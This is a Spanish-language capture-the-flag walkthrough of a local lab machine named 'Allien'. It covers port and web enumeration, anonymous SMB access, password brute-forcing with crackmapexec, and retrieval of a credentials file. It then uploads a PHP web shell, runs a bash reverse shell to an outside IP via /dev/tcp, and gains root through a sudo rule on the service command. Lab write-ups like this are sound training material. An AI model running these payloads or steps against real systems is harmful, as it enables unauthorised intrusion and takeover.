- Tags: #Allien
---
[Maquina Allien](https://mega.nz/file/6RVkASLT#-F9PMveM06geq87FUaUAuHFpkEq85tG61zZGkswgcsE) -> Enlace de descarga al laboratorio.

```bash
7z x allien.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh allien.tar # Desplegamos el laboratorio
```
#### Fase Reconocimiento:
```bash
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conectividad con el taraget.

wichSystem.py 172.17.0.2 # Determinamos que esamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```
#### Fase Reconocimiento Puertos:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-5000 # Usamos nuestra herramienta para enumerar desde el 1 al puerto 5000
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos descubrimiento de puertos.
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo.
nmap -sC -sV -p22,80,139,445 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar el servicio y la version que corren detras de estos puertos.
```

**( 22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0) )** -> Servicio ssh expuesto
**( 80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu)) )** -> Servicio web expuesto. **( ubuntuNoble )**
**( 139/tcp open  netbios-ssn Samba smbd 4 )** -> Servicio **SMB** expuesto
**( 445/tcp open  netbios-ssn Samba smbd 4 )** -> Servicio **SMB** expuesto
#### Fase Enumeracion Web:
```bash
whatweb http://172.17.0.2 # No reporta nada critico

nmap --script http-enum -p80 172.17.0.2 # Nos reporta
/info.php: Possible information file # Tenemos un archivo
```

**( http://172.17.0.2/info.php )** -> Revisaremos este archivo para poder detectar una mala configuracion en el servicio php

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,back,html,js # Filtrando por archivos tenemos los siguientes.

/index.php            (Status: 200) [Size: 3543]
/info.php             (Status: 200) [Size: 72704]
/productos.php        (Status: 200) [Size: 5229]
```
#### Fase Enumeracion Samba:
```bash
nmap -p 139,445 -sV --script smb-os-discovery 172.17.0.2 # Detectamos la version de este servicio es version 4

nmap -p 445 --script smb-protocols 172.17.0.2 # Detectamos los protocolos aceptados por este servicio
Host script results:
| smb-protocols: 
|   dialects: 
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
```

```bash
smbclient -L 172.17.0.2 -N # Listamos recurso que no requieran credenciales

Anonymous login successful # Usuario anonymous habilitado

        Sharename       Type      Comment
        ---------       ----      -------
        myshare         Disk      Carpeta compartida sin restricciones # Carpeta compartida
        backup24        Disk      Privado
        home            Disk      Produccion
        IPC$            IPC       IPC Service (EseEmeB Samba Server)
```

```bash
smbclient //172.17.0.2/myshare -N # Logramos conectarnos como el usuario anonymous
```

```bash
enum4linux -a 172.17.0.2 # Enumeracion exhaustiva del servico samba

S-1-22-1-1004 Unix User\satriani7 (Local User) # Aplicaremos fuerza bruta a este usuario con hydra
S-1-22-1-1005 Unix User\administrador (Local User)

crackmapexec smb 172.17.0.2 -u 'satriani7' -p /usr/share/wordlists/rockyou.txt # Aplicamos fuerza bruta.
[+] SAMBASERVER\satriani7:50cent  # Tenemos la password.
```

```bash
smbmap -H <IP> -u "satriani7" -p "50cent" # Listamos los recursos compartido para este usuario.
smbmap -H 172.17.0.2 -u "satriani7" -p "50cent" -r backup24/Documents/Personal  # Logramos detectar estas rutas donde contempla un archivo.
fr--r--r--              902 Sun Oct  6 07:23:28 2024    credentials.txt # Tenemos un archivo potencial.
```

```bash
smbclient //172.17.0.2/backup24/ -U satriani7%50cent # Nos conectamos como este usuario.
get credentials.txt # Nos descargamos este archivo.
```

```bash
7. Usuario: administrador # Usaremos estas credenciales para acceder como administrador por ssh
    - Contraseña: Adm1nP4ss2024 
ssh-keygen -R 172.17.0

smbclient //172.17.0.2/backup24/ -U administrador%Adm1nP4ss2024 # Ahora nos conectamos a este recurso del administrador.

dir # Listamos el contenido para ver que es lo mismo que tenemos cuando iniciamos la web
  .                                   D        0  Sun Oct  6 23:40:09 2024
  ..                                  D        0  Sun Oct  6 23:40:09 2024
  styles.css                          N      263  Sun Oct  6 09:22:06 2024
  info.php                            N       21  Sun Oct  6 07:32:50 2024
  index.php                           N     3543  Sun Oct  6 20:28:45 2024
  productos.php                       N     5229  Sun Oct  6 09:21:48 2024
  back.png                            N   463383  Sun Oct  6 07:59:29 2024

```

**Nota** -> Cargaremos un archivo **php** malicioso para poder derivarlo a un **RCE** en el servcio web, Procederemos a crearlo el archio que contendra las siguietes instrucciones.
```php
<?php
	system($_GET["cmd"])
?>
```

```bash
cmd.php                             A       33  Wed May 21 21:28:11 2025 # Ahora ya esta cargado, el archivo.
```

**( http://172.17.0.2/cmd.php?cmd=whoami )** -> Ahora tenemos capacidad de ejecucion de comandos.

```bash
nc -nlvp 443

172.17.0.2/cmd.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/192.168.100.22/443 <%261' -> Ejecutamos para ganar acceso a la maquina.
```

#### Fase Escalada:
```bash
sudo -l

User www-data may run the following commands on 4af7fdb6cac1:
    (ALL) NOPASSWD: /usr/sbin/service # Tenemos una via potencial de elevar privilegios.
```

```bash
/var/www/html$ sudo -u root /usr/sbin/service ../../bin/bash # Ahora Somos root.
```